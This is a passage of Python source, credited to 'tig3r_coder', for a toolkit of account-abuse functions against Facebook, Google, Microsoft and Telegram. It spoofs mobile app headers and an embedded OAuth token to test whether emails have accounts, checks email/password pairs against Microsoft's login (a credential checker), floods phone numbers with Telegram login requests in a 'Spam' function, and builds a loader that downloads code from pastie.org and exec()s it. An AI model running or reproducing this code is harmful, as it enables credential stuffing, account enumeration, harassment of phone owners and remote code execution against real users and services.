    'User-Agent': f"[FBAN/FB4A;FBAV/{random.randint(400, 500)}.0.0.{random.randint(10, 99)}.{random.randint(10, 99)};FBBV/{random.randint(600000000, 700000000)};FBDM/{{density={round(random.uniform(1.0, 4.0), 2)},width={random.randint(720, 1440)},height={random.randint(1280, 3040)}}};FBLC/{random.choice(['ar_AR', 'en_US', 'fr_FR', 'es_ES', 'de_DE'])};FBRV/0;FBCR/{random.choice(['Yemen Mobile', 'Verizon', 'AT&T', 'T-Mobile', 'Vodafone'])};FBMF/{random.choice(list({'Xiaomi': ['Redmi Note 8 Pro', 'Mi 10', 'Mi 11', 'Poco X3'], 'Samsung': ['Galaxy S21', 'Galaxy Note 20', 'Galaxy A52'], 'OnePlus': ['OnePlus 9', 'OnePlus 8T', 'OnePlus Nord'], 'Huawei': ['P30 Pro', 'Mate 40 Pro', 'P40 Lite'], 'Oppo': ['Oppo Reno5', 'Oppo A54', 'Oppo Find X3']}.keys()))};FBBD/{random.choice(list({'Xiaomi': ['Redmi Note 8 Pro', 'Mi 10', 'Mi 11', 'Poco X3'], 'Samsung': ['Galaxy S21', 'Galaxy Note 20', 'Galaxy A52'], 'OnePlus': ['OnePlus 9', 'OnePlus 8T', 'OnePlus Nord'], 'Huawei': ['P30 Pro', 'Mate 40 Pro', 'P40 Lite'], 'Oppo': ['Oppo Reno5', 'Oppo A54', 'Oppo Find X3']}.keys()))};FBPN/com.facebook.katana;FBDV/{random.choice(random.choice(list({'Xiaomi': ['Redmi Note 8 Pro', 'Mi 10', 'Mi 11', 'Poco X3'], 'Samsung': ['Galaxy S21', 'Galaxy Note 20', 'Galaxy A52'], 'OnePlus': ['OnePlus 9', 'OnePlus 8T', 'OnePlus Nord'], 'Huawei': ['P30 Pro', 'Mate 40 Pro', 'P40 Lite'], 'Oppo': ['Oppo Reno5', 'Oppo A54', 'Oppo Find X3']}.values())))};FBSV/{random.randint(8, 13)};FBOP/1;FBCA/{random.choice(['arm64-v8a', 'armeabi-v7a'])}:]",
    'Content-Type': 'application/x-www-form-urlencoded',
    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
}
			data = {
    'method': 'post',
    'pretty': 'false',
    'format': 'json',
    'server_timestamps': 'true',
    'locale': 'ar_AR',
    'purpose': 'fetch',
    'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.caa.ar.search.async',
    'fb_api_caller_class': 'graphservice',
    'client_doc_id': '119940804214876861379510865434',
   'variables': '{"params":{"params":"{\\"params\\":\\"{\\\\\\"client_input_params\\\\\\":{\\\\\\"text_input_id\\\\\\":\\\\\\"tobe9t:98\\\\\\",\\\\\\"flash_call_permissions_status\\\\\\":{\\\\\\"READ_PHONE_STATE\\\\\\":\\\\\\"GRANTED\\\\\\",\\\\\\"READ_CALL_LOG\\\\\\":\\\\\\"DENIED\\\\\\",\\\\\\"ANSWER_PHONE_CALLS\\\\\\":\\\\\\"DENIED\\\\\\"},\\\\\\"was_headers_prefill_available\\\\\\":0,\\\\\\"sfdid\\\\\\":\\\\\\"'+str(uuid.uuid4())+'\\\\\\",\\\\\\"attestation_result\\\\\\":{\\\\\\"data\\\\\\":\\\\\\"'+'\\\\\\",\\\\\\"signature\\\\\\":\\\\\\"MEQCIAk\\\\/xa+MQqn32hOSdmKXtyfl0EiXoV8VZxcKT8W1NhWxAiAml5Vi18aH7bCeJRcUUN3yCnOdysMIwGOUzltj5vWDCw==\\\\\\",\\\\\\"keyHash\\\\\\":\\\\\\"6d820b21ce137975894e445c9fa0942c495e3dc9fc726e4af7a430c12554bdb2\\\\\\"},\\\\\\"fetched_email_token_list\\\\\\":{\\\\\\"mkwk@gmail.com\\\\\\":\\\\\\"\\\\\\",\\\\\\"mahos@gmail.com\\\\\\":\\\\\\"\\\\\\",\\\\\\"alhrrani@gmail.com\\\\\\":\\\\\\"\\\\\\",\\\\\\"ahmed@gmail.com\\\\\\":\\\\\\"\\\\\\"},\\\\\\"search_query\\\\\\":\\\\\\"'+email+'\\\\\\",\\\\\\"android_build_type\\\\\\":\\\\\\"\\\\\\",\\\\\\"sim_state\\\\\\":5,\\\\\\"accounts_list\\\\\\":[{},{}],\\\\\\"is_oauth_without_permission\\\\\\":0,\\\\\\"ig_oauth_token\\\\\\":[],\\\\\\"is_whatsapp_installed\\\\\\":1,\\\\\\"lois_settings\\\\\\":{\\\\\\"lois_token\\\\\\":\\\\\\"\\\\\\",\\\\\\"lara_override\\\\\\":\\\\\\"\\\\\\"},\\\\\\"was_headers_prefill_used\\\\\\":0,\\\\\\"headers_infra_flow_id\\\\\\":\\\\\\"'+str(uuid.uuid4())+'\\\\\\",\\\\\\"fetched_email_list\\\\\\":[\\\\\\"mkwk@gmail.com\\\\\\",\\\\\\"mahos@gmail.com\\\\\\",\\\\\\"alhrrani@gmail.com\\\\\\",\\\\\\"ahmrd@gmail.com\\\\\\"],\\\\\\"sso_accounts_auth_data\\\\\\":[],\\\\\\"encrypted_msisdn\\\\\\":\\\\\\"\\\\\\"},\\\\\\"server_params\\\\\\":{\\\\\\"event_request_id\\\\\\":\\\\\\"'+str(uuid.uuid4())+'\\\\\\",\\\\\\"is_from_logged_out\\\\\\":0,\\\\\\"layered_homepage_experiment_group\\\\\\":null,\\\\\\"device_id\\\\\\":\\\\\\"'+str(uuid.uuid4())+'\\\\\\",\\\\\\"waterfall_id\\\\\\":\\\\\\"'+str(uuid.uuid4())+'\\\\\\",\\\\\\"machine_id\\\\\\":\\\\\\"C1sTZ7GGwJnOObihmO8ymTJR\\\\\\",\\\\\\"INTERNAL__latency_qpl_instance_id\\\\\\":1.79436160100102E14,\\\\\\"is_platform_login\\\\\\":0,\\\\\\"context_data\\\\\\":\\\\\\"\\\\\\",\\\\\\"INTERNAL__latency_qpl_marker_id\\\\\\":36707139,\\\\\\"family_device_id\\\\\\":\\\\\\"'+str(uuid.uuid4())+'\\\\\\",\\\\\\"offline_experiment_group\\\\\\":\\\\\\"caa_iteration_v6_perf_fb_2\\\\\\",\\\\\\"INTERNAL_INFRA_THEME\\\\\\":\\\\\\"harm_f,default,harm_f\\\\\\",\\\\\\"access_flow_version\\\\\\":\\\\\\"F2_FLOW\\\\\\",\\\\\\"is_from_logged_in_switcher\\\\\\":0}}\\"}","bloks_versioning_id":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5","app_id":"com.bloks.www.caa.ar.search.async"},"scale":"3","nt_context":{"using_white_navbar":true,"styles_id":"cfe75e13b386d5c54b1de2dcca1bee5a","pixel_ratio":3,"is_push_on":true,"debug_tooling_metadata_token":null,"is_flipper_enabled":false,"theme_params":[],"bloks_version":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"}}',
    'fb_api_analytics_tags': '["GraphServices"]',
    'client_trace_id': str(uuid.uuid4()),
}
			response = requests.post('https://b-graph.facebook.com/graphql', headers=headers, data=data).text.replace('\\', '').replace('/', '')
			if any(keyword in response for keyword in ["oauth_fpf_data", 'is_xapp_or_f3_cp', 'is_on_profile', '"email", true,']):
				return {'Programmer': 'tig3r_coder', 'Check': 'Good'}
			else:
				return {'Programmer': 'tig3r_coder', 'Check': 'Bad'}
		except Exception as e:
			return e


import requests,random
abc = 'azertyuiopmlkjhgfdsqwxcvbn'

class Gmail:
	@staticmethod
	def CheckGmail(email):
		if '@' in email:email=email.split('@')[0]
		s = requests.Session()
		while True:
			try:
				headers = {
					'accept': '*/*',
					'accept-language': 'en',
					'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
					'dnt': '1',
					'origin': 'https://accounts.google.com',
					'referer': 'https://accounts.google.com/',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
					'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
					'x-same-domain': '1',
				}
				params = {
				'biz': 'false',
				'continue': 'https://mail.google.com/mail/u/0/',
				'ddm': '1',
				'emr': '1',
				'flowEntry': 'SignUp',
				'flowName': 'GlifWebSignIn',
				'followup': 'https://mail.google.com/mail/u/0/',
				'osid': '1',
				'service': 'mail',
			}
				response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
				TL = response.url.split('TL=')[1]
				at = str(response.text).split('"SNlM0e":"')[1].split('"')[0].replace(':','%3A')
				s1 = str(response.text).split('"Qzxixc":"')[1].split('"')[0]
				headers.update({'x-goog-ext-391502476-jspb':'["{}"]'.format(s1)})
				break
			except:''
		while True:
			try:

				name = ''.join(random.choice(abc) for i in range(random.randrange(5,10)))
				params = {
					'rpcids': 'E815hb',
					'source-path': '/lifecycle/steps/signup/name',
					'hl': 'en-US',
					'TL': TL,
					'rt': 'c',
				}

				data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)

				response = s.post(
					'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
					params=params,
					headers=headers,
					data=data,
				)
				break
			except:''
		while True:
			try:
				params = {
					'rpcids': 'eOY7Bb',
					'source-path': '/lifecycle/steps/signup/birthdaygender',
					'hl': 'en-US',
					'TL': TL,
					'rt': 'c',
				}
				data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C5%2C20%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3CpGhqaDACAAbe5ec5_uWNRGP8ADzN4FP0ADQBEArZ1Bi3KqRJ2jEufwzhM9DCOkC4py-Spwe8Dm8vIGEUYahQ0cFE1MsIiaW04C_7CxtFzQAAAladAAAAC6cBB7EATZbZc1lblBs3Pyjn18zoKs0dzS4aUpxAwryVbv8iPsaM1XfBJCrUEYx0hOeeUpwbG0Hh59jAFDOul1Q_nXL2xdN3okPfS1tlHQRMBJkUVg39qy9DpG6iLGbC4D3MlzWYexF_GQc5fwWVzu6zeexxryAR74fHHwp0x0VOHm6vsiReDmPuSJw-gea4iEzzhe0QA2CCW_YekjZ0Qu3W544ixt8rdoYcsk8Jx21EFQ2k8f_vdzbtHtdhYJl2In3oIPKXLAuFtsQmkrO0x0myDa_sbuNf8EPswGx_xGrBNciJwrVAVt8jmaK1kncj4VeueZn8pvlElhCpvVkyxFaJdlklKjKbvq4AGdu65_wFWX-nSbvq_EujfCGd1jF2uVxfx9GxGCkETqWFX2TItzMYOygG39N3e0u9zxG2rR9WxO1EKw-wOv_T_Nyc9UuV4oeTCC9s66OE7HyvcZn17B58qzplRRM6xOPKqaAL6blvAlAmsDvujYBUGZmXO4558-0rCrIF6_tyceib3scY62d_lGyGe-qLvMwRJ0a3JOo_r9S2vq15Pt6VATO-nzhs2mpk-K7_A6r9PC9KMxgktD_q7y9lhF_Hd1Hb92Rz2OgzCwuat9LnEIA6rNkoJ5Ev52PFtblk-NNHz3RmX_wLZ86pYeUgMfVTTlOBEQBodV97FHO_QV-4BtwPST0xe9P3zkAEiuFYf4KFwjj131Icb_a8sX_Rd9_ebfpRfvb76EWJyTfnW7WCTzyph22-lFrMnPcGK92FOUod62lZFoEy84QzevvX311QwdDuJWdqPwmvBEHMYpfW5yKlrxOr4f8i2DimNkRq2MiDbsW2ZnnnXhKzBAQgYghjSaAJ3ofdFhfE5yBWynv3IVxW_rEgpE7CYAPopkWqZUVsBtH0FA8o08ZSvmlt0p-thgwYQgJHmiWtTyMek5c_cSdoN5cqLk-JxOL2XBE68aPGC1JKyFCACcDCNnJR3DzncD1ZS4lchyFPsKyyalMzWp53CNH2aeoKLAdHyVz8TgpM56GcO1PpWKYzu0882T-AWvCaZEKqi9Qyb8fvCLFaxlzMGVEvCn2dU2q5LBNxJ0VsjljtR_aqLSEQ4tx5EITA5cyYA1-S_rQtDuCvCGC1-fDf8bsAckU7RNMh5pKZlXvzhlnHTnex6r6CaI7EnqUkw-NcuZpqq65s2o_4CnS23t5EAY7hTcBseN9h1eFkse2KnNDou38FjETsJpb6Fy1mLu-yzQ0tD152f39v9RVEUP4oMFLJO76O899vkgxxL3rQLk8EGXQDqaFjN5busj4VOhI6NIjqf1i9K0gKaBoHGSHG3gBqkXYXygJeiy_f8J2-VeG44bwNZl_m5P6L-Ce8c91zzZswM1MhPZqnz8_JUW-2LcBw5fNFDnQQ-fynszm4WY8F3PXxhdEoaun9xLOtqIeR8GPXPadPdE13RsBQdSibk6pw7ixPqieKkUbFD5wIKTD_UZf8tO0vc2QWH_5gHSSX-WjIoOEXHYWgUQt99fCXNTx1P8XL27N4CDgYR82-9QENXeP7qPAYBfcnWrtkvlRC8aRyxoMA_xS8BpYtsb5nKu1H6n4Mk4wgf0MZLIgC5E__IJy4ojRBCbBwams04rUlXWyB2llJ0Lo4SunQffsLiQqGxhMzhkwStuPgv7BHXY-kDPLyZXx-cewDw9ZjhvtJPpK6nW873_WkIO542o7kF_oNZRlE3pyLbdOabPG11KCjMIZgBEVpdzPssPPu6TXvh6F6_klPozrjf35DsktV7c-c3a2OVPKoYJtcQnwCA4UnHqR_i1-N1wxlooGJ6GUBI7H8wZmj_B2jjvqFWOfdLB8_bDmEysG_brczvsnyl-mGwipdMHPRZ70HpyGOign0Rg8JAQrVOnKH_oXkFjPmzGM3vXNOJ2tndrE9Z2isXvs_RPGpgUDiNbNYyJjLCmHJWz4mvyo5DrtANi-5qifEMEdrM9kxWKolh6meQd8Vx8Z61zQR5oQSu_V6lafpELV_fK7tZSHfRwlBAxx26rZaTXDI1yxSPk9Pmt_lfPiecmlRa43bCZQVPmj3rf0nQJf3_I8rUmFv4IemINkUEZBtVVBHIjJusuRI49-zoQMp1UsmbMiL17F1_sTwibBEvk2LjbF9Jo7HbGTqtLzZ0oLButszorJ4Hp0fq9GL4tJoMT2wbACAycYSvl-9LGX8JtYoMOkKnqLg3oRCRbeitDMAaQCSuGxSUCjTxkfAD_UCs3pBPvC3jYk5sK-SuKKIO48qJ_p8AYQkFutKtclzf2-P-SQozeuQYLpf5Ch2WtFpmm40DQ58SZ8OTxzMubG_q5K1t2ZsknjqnOMfzegagfp2_Lbm2ReTba9jJdH2EZ1zSoDyMV73O1NeSG8MCfBqqtjvevUtXq1T21l-f2Pcj_KYZ09uk50rTdkbDKXJ65Rr8EaLUVYveJ6Mcc7n740N7x-v8P3VUUYjNHDlbJbrWZ7J7PvfreGCZw7_jZDHd2_Fw5NvuJH7UXnrqEVzT3xvT8Wavpj1OCTyA0ItJPrSFo3JsvBWNsKaP0F34uSxlwpteTqzORTNjxN4QaGWFpzapvX3IYCkADk8iv3Oqm3OYtwtBW6Wm8ezJoySogZME2BHlcOLIajHAPR0isdLwXXSD9dzPO_zsfKB8Q7zM9DN-xwM9mQsQrsRCTq_cUjWxiqfonxFDIZx-UT5ez-U1az-JcfIwhlCtgiRt3s88omlG7znGNZSzu9V6P3szV5oT4ydTH1wQILd50eteZxhj4z7n0QbN5NUBd9nxK5NVYMs96NuwS7ZTOJB-fd_kr85giz0Om6_CY7CGhRwAM14oPpwNeyFQWsKpXOWR3huLTGQX3iFaspc_-F-UcYbA01_gafjo9sQqjn5oYrRVRIMu1pSzlYhfFWny0RoDWIEA-2eC3xjxrYWQASloqsyDUBetIuECA3Cr5BfQj-vcBa8GmQqjUGRJ1UxreLUrtoE9K7-BUkTSqfC6_ItIp8w7SXKnD4HImqa3NMvy6tqzHhNcrdhyAsNqnQG-by00SLuBMz2eHe49gTNyBiDrIjDzUYjieEn7X8DW8Z-QKdkJ3up_h5Q4XO9MkQ0pSi-YLVpkq7BBg_tUpwzOsQyhmVqm6gIZ6zDWIsc9iEkXzROe-aHxVwPsVSOUFXuDgCHQC7PqXl_ZkfA6XoOANg6mnqDJwKmE48pDHHq11tln2yGy0sDoN7et3FGFUV5nKEhUvkDq-FX-h1vBUKFpb5wdpiENT5Bz77GyiKHK8TwvFHZTUl6jgjIhYPYscylYG1U-_38hDBDxcNeCToG1ytkEqJMBLvBj0Q0iVeehPzzxFEYYZDhupE2wjgdp_RfOhqp30fRWBNSRk-XuAb-Ruasj7q6GHSm5ih2ukiloyRWBbr9QtTuOL_6LCvP_2-0yo18mMM1Az3jsmgDZHJGYPnE8LArBa2icMHRWdI1I5W_g45CaPogPMNMbRQZCvsGJJb6vwHa_4V69uB-FIjZxEoJwS8n10nRyAzxhedAp0udy3hYy43vNGg5CYgwNq8hFBqirHq3gRnh_fwzuAl56QHlvSD9clH6mgZbGLyz3-RlbLDRUGE7ev8GR-OQ0gxA2pBhRIQOl_DuHvWS_fshRRtTGXRkxZCv2X3lz6y7hMtztBPQ06LdIb0WaIkQgjJvwEthghzRWLUlkNd5wiC6tpRHQ9yWcnyQMgX13KFDWVa8sGoVyil_Wyxn1jfqbuCnuJdkdQhg72zZ5uFxtw8eH1Mgf8ab-n6LMLUbNCsbS7cz26IV-qmsIJA-m4b9AVZMPTgprpJwWUY3JYPqesT1zeoi4ZnDCYFCXlANT4NYI3a9hX--e7SsHcYGsddaq6HrP894ffqXbfyJ5J3n5fX8UHMu4aMe9Qa43Sw8eNfXPgewGtz34AIesPXDBPcVnS3-xdoK3K6gxqu8xc-hHt6Fo8Swb7cgV7HwQ9V2qpWc3P9XsGwGjVBpM6K-x30vqW9Kw89tLPAWEOlctJ8YGMFG_fujAVNN61GpvjfTcOzIaIIxLQjMkF89TQd3XE4ncgabEhbzjIS5SUVqSi3aG5wGdQ-vB_PYGDS3xonKccgoLg_UPeDnKuFHhoPDWq9P6IJQVagPLfuzzI76f8Rj3dJH3LnDlIVPcNwlHpX-YmYCniKytU5dQnX0AWLlQy_1z77IHhWU63yrQyoMU9iky4FUaeeJsLgx3XpVpR9PjhAGCFqUrr0ykCTpgADyyrNLs62wxVw-3bA0QsBca6LfD6eKCsWUHKRuhIKzy5I9S5XQ66WhHfNcPB7XbtdsQOBMBlB0v8gM5EKjNAic56B5Jb39ILbd_WT7xywRe9If-rXg9fHnGTApfNJKKMFsRr18Twkp11HFqV5M3Eg4oClga9aVvnwd751J4hLAWdo9bep0GS8pyX_SLQOM0dqpg6kANBYlpEczBWa_gCVdfpVOvOsp5GyoQHiHZVcu8p4fmXUd60LkmjyO4fMhqHtjnQjKXJorpNcCQK8w-RjcBw8Z7liV4zZts52-J5jfrXrDd2236i6OhNDlMqb6evHStjjJcc7jKqxnQ17A1wklO68gB8st3OuFPPiJXlnczSKJOyji0BVGPQUKztyJSlz-hcKWUgHLDoyYm34SrhDurlt-pcKA5MyHHRIH5nC6wFm6orlLD5OwoKyXfB48ylnPm2gDmDvdtctEDpXy3Qa-ZILfv7rCQkTFvef2qbdvxFwpGMoP_AyX5Ah8muwu8TYVlf63HWqIzev6tM1fOUAmadvdcjqhp5GTMbm5ewqWBzQNdjU5GjQLBkvQv2yRxFmkyvwr77rvCbgcaP6FLNFG1kI8RKh1E6HoCZnsCB7MVQptShtbtuSljBcxZ50%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(random.randrange(1990,2007),at)

				response = s.post(
					'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
					params=params,
					headers=headers,
					data=data,
				)
				break
			except:''
		while True:
			try:

				params = {
					'rpcids': 'NHJMOd',
					'source-path': '/lifecycle/steps/signup/username',
					'hl': 'en-US',
					'TL': TL,
					'rt': 'c',
				}

				data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C1%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C236841%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

				response = s.post(
					'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
					params=params,
					headers=headers,
					data=data,
				).text

				if 'password' in response:
					return {'Programmer': 'tig3r_coder', 'Check': 'Good'}
				else:
					return {'Programmer': 'tig3r_coder', 'Check': 'Bad'}
			except Exception as e:
				return e

class Hotmail:
	@staticmethod
	def Login(Email,Password):
		import requests , uuid 
		headers = {
	    "Connection": "keep-alive",
	    "Upgrade-Insecure-Requests": "1",
	    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
	    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	    "return-client-request-id": "false",
	    "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
	    "x-ms-sso-ignore-sso": "1",
	    "correlation-id": str(uuid.uuid4()),
	    "x-client-ver": "1.1.0+9e54a0d1",
	    "x-client-os": "28",
	    "x-client-sku": "MSAL.xplat.android",
	    "x-client-src-sku": "MSAL.xplat.android",
	    "X-Requested-With": "com.microsoft.outlooklite",
	    "Sec-Fetch-Site": "none",
	    "Sec-Fetch-Mode": "navigate",
	    "Sec-Fetch-User": "?1",
	    "Sec-Fetch-Dest": "document",
	    "Accept-Encoding": "gzip, deflate",
	    "Accept-Language": "en-US,en;q=0.9",
	}
		try:
			response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(Email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D" ,headers=headers)
			PPFT = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
			cok = response.cookies.get_dict()
			URL = response.text.split("urlPost:'")[1].split("'")[0]
			PPFT = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
			AD = response.url.split('haschrome=1')[0]
			MSPRequ = cok['MSPRequ']
			uaid = cok['uaid']
			RefreshTokenSso = cok['RefreshTokenSso']
			MSPOK = cok['MSPOK']
			OParams =  cok['OParams']
		except Exception as e:
			Hotmail.Login(Email,Password)
		try:
			lenn = f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={Password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
			Ln = len(lenn)
			headers = {
		    "Host": "login.live.com",
		    "Connection": "keep-alive",
		    "Content-Length": str(Ln),
		    "Cache-Control": "max-age=0",
		    "Upgrade-Insecure-Requests": "1",
		    "Origin": "https://login.live.com",
		    "Content-Type": "application/x-www-form-urlencoded",
		    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
		    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		    "X-Requested-With": "com.microsoft.outlooklite",
		    "Sec-Fetch-Site": "same-origin",
		    "Sec-Fetch-Mode": "navigate",
		    "Sec-Fetch-User": "?1",
		    "Sec-Fetch-Dest": "document",
		    "Referer": f"{AD}haschrome=1",
		    "Accept-Encoding": "gzip, deflate",
		    "Accept-Language": "en-US,en;q=0.9",
		    "Cookie": f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid}"}
			res = requests.post(URL,data=lenn,headers=headers,allow_redirects=False)
			cook = res.cookies.get_dict()
			hh = res.headers
			if any(key in cook for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
				return {'Programmer': 'tig3r_coder', 'Login': 'Good'}
			else:
				return {'Programmer': 'tig3r_coder', 'Login': 'Bad'}
		except Exception as e:
			return e
			
	@staticmethod
	def CheckEmail(email):
	    import requests , random , re
	    version = random.choice(["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"])
	    platform = random.choice(["Macintosh; Intel Mac OS X 10_15_7","Macintosh; Intel Mac OS X 10_14_6","iPhone; CPU iPhone OS 14_0 like Mac OS X","iPhone; CPU iPhone OS 13_6 like Mac OS X"])
	    user_agent = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
	    response = requests.post('https://signup.live.com',headers={'user-agent': user_agent})
	    try:
	        amsc = response.cookies.get_dict()['amsc']
	        match = re.search(r'"apiCanary":"(.*?)"', response.text)      
	        if match:
	            api_canary= match.group(1)
	            canary = api_canary.encode().decode('unicode_escape')
	            response = requests.post(
      'https://signup.live.com/API/CheckAvailableSigninNames',cookies={'amsc':amsc},headers={'authority': 'signup.live.com','accept': 'application/json','accept-language': 'en-US,en;q=0.9','canary': canary,'user-agent': user_agent},json={'signInName': email})
	            if '"isAvailable":true' in response.text:
	            	return {'Programmer': 'tig3r_coder', 'Check': 'Good'}
	            else:
	            	return {'Programmer': 'tig3r_coder', 'Check': 'Bad'}
	    except Exception as e:
	    	return e	        
class Telegram:
	@staticmethod
	def SearchChannel(s):
		h = 0
		import re , cloudscraper
		cloud = cloudscraper.create_scraper()
		r = cloud.get(f'https://telegramchannels.me/search?search={s}&type=all').text
		c = re.findall(r'<b class="is-underlined">(.+?)</b>',r)
		l = re.findall(r'<a href="(.+?)"',r)
		g = re.findall(r'<div class="subtitle is-size-7 mt-2 has-text-grey ">\s*(.+?)(.+?)\s*\s*<i class="fas fa-bullhorn"></i>\s*([\d.]+K?|\d+)',r)
		list = []
		for x in range(min(len(c),len(l),len(g))):
		  h += 1
		  z,f,ff = g[x]
		  chh = l[x].split('/')[-1]
		  a = {'Num': h, 'Name': f'{c[x]}', 'UserName': f'@{chh}', 'Members': f'{ff}'}
		  list.append(a)
		return list

	@staticmethod
	def Spam(num):
		import requests , user_agent
		payload = f"phone={num}"
		headers = {
  'User-Agent': user_agent.generate_user_agent(),
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'Content-Type': "application/x-www-form-urlencoded",
  'sec-ch-ua': "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Android WebView\";v=\"128\"",
  'sec-ch-ua-platform': "\"Android\"",
  'x-requested-with': "XMLHttpRequest",
  'sec-ch-ua-mobile': "?1",
  'origin': "https://oauth.telegram.org",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write",
  'accept-language': "en,en-YE;q=0.9,en-US;q=0.8,en;q=0.7",
  'priority': "u=1, i",
}
		try:
			response = requests.post("https://oauth.telegram.org/auth/request", params={'bot_id': "5444323279",'origin': "https://fragment.com",'request_access': "write",}, data=payload, headers=headers).text
			if 'true' in response:
			     return {'Programmer': 'tig3r_coder', 'Spam': 'Good'}
			elif 'Sorry' in response:
			     return {'Programmer': 'tig3r_coder','Spam': 'Bad', 'Message': 'You can send 10 messages every 20 to 30 minutes'}			
			else:
				return {'Programmmer': 'tig3r_coder', 'Spam': 'Bad'}
		except Exception as e:
			return e


class Code:
	@staticmethod
	def link(code):
		import requests , re
		headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'http://pastie.org',
                'Referer': 'http://pastie.org/',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            }
		res = requests.post('http://pastie.org/pastes/create', headers=headers, data={'language': 'plaintext','content': code}, verify=False).text
		link = re.search(r'<div class="item"><a href="([^"]+)">raw</a></div>', res).group(1)
		return f'''import requests\nres=requests.get('http://pastie.org{link}')\nexec(res.text)'''
	
	@staticmethod
	def py_php(code):
		import requests , user_agent
		cookies = {
